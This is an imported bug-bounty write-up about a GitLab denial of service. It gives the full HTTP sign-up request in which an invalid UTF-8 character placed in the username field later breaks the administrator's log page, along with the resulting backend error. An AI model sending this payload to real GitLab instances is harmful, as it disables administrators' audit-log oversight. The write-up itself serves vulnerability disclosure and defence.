---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-02-12_gitlab-denial-of-service-via-login-panel-functionality_2.md
original_filename: 2021-02-12_gitlab-denial-of-service-via-login-panel-functionality_2.md
title: '[GITLAB] — Denial of service via “Login Panel” functionality.'
category: documents
detected_topics:
- ssrf
- command-injection
- otp
tags:
- imported
- documents
- ssrf
- command-injection
- otp
language: en
raw_sha256: 8f579c659765f4ead09e8d9fd3291df60b81aa1b64ef9e99448db3654f2df7bf
text_sha256: 9bc26c68e9ce4bbc117bcebe9556e28086d4136dded674bf7e5d4766b8518d00
ingested_at: '2026-06-28T07:32:04Z'
sensitivity: unknown
redactions_applied: false
---

# [GITLAB] — Denial of service via “Login Panel” functionality.

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-02-12_gitlab-denial-of-service-via-login-panel-functionality_2.md
- Source Type: markdown
- Detected Topics: ssrf, command-injection, otp
- Ingested At: 2026-06-28T07:32:04Z
- Redactions Applied: False
- Raw SHA256: `8f579c659765f4ead09e8d9fd3291df60b81aa1b64ef9e99448db3654f2df7bf`
- Text SHA256: `9bc26c68e9ce4bbc117bcebe9556e28086d4136dded674bf7e5d4766b8518d00`


## Content

---
title: "[GITLAB] — Denial of service via “Login Panel” functionality."
url: "https://ltsirkov.medium.com/gitlab-denial-of-service-via-login-panel-functionality-684c8583706c"
authors: ["Lyubomir Tsirkov (@lyubo_tsirkov)"]
programs: ["GitLab"]
bugs: ["Application-level DoS"]
publication_date: "2021-02-12"
added_date: "2023-05-04"
source: "pentester.land/writeups.json"
original_index: 3915
scraped_via: "browseros"
---

# [GITLAB] — Denial of service via “Login Panel” functionality.

[GITLAB] — Denial of service via “Login Panel” functionality.
Lyubomir Tsirkov
Follow
2 min read
·
Feb 12, 2021

61

After reporting the SSRF issues, I proceeded to explore the application. It was a matter of time to discover something else … A few hours later I identified “Denial Of Service” vulnerability that could be leveraged by the attacker in such manner as to block the administrative’s access to the “Log Audit Page”.

At first, the vulnerability was possible to be exploited only as an authenticated user. Then I noticed that the login form suffered from the same issue and it wasn’t mandatory to use a user account.

Steps to reproduce:

Get Lyubomir Tsirkov’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Append invalid utf8 character to the username field and forward the request.

POST /users HTTP/1.1
Host: 192.168.199.243
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:64.0) Gecko/20100101 Firefox/64.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.199.243/users/sign_in
Content-Type: application/x-www-form-urlencoded
Content-Length: 313
Connection: close
Cookie: sidebar_collapsed=false; convdev_intro_callout_dismissed=true; _gitlab_session=0bf82601779beb3b2508af113e208049; event_filter=all; hide_auto_devops_implicitly_enabled_banner_12=false
Upgrade-Insecure-Requests: 1
utf8=%E2%9C%93&authenticity_token=MaS%2B21c7gMU6teJMur43ILwFU6KJetpGDgPIqIwbWDtbPOniGMmZasElptpXoimFLkAzotv5Df2Mvytbz9tUPQ%3D%3D&new_user%5Bname%5D=TESTDOS&new_user%5Busername%5D=TEESTDOS&new_user%5Bemail%5D=TESTDOS%40abv.bg&new_user%5Bemail_confirmation%5D=TESTDOS%40abv.bg&new_user%5Bpassword%5D=TESTDOS%40abv.bg
Log in as Administrator and go to “Logs Page” in Admin panel.
You won’t be able to open “Logs Page”.

The following page was shown:

Press enter or click to view image in full size

The following error was triggered on the back-end.

ActionView::Template::Error (invalid byte sequence in UTF-8):
  21:  Scroll down
  22:  .file-content.logs
  23:  %ol
  24:  - klass.read_latest.each do |line|
  25:  %li
  26:  %p= line

Impact

Administrator won’t be able to see any logs through Gitlab Administrative panel.

Press enter or click to view image in full size
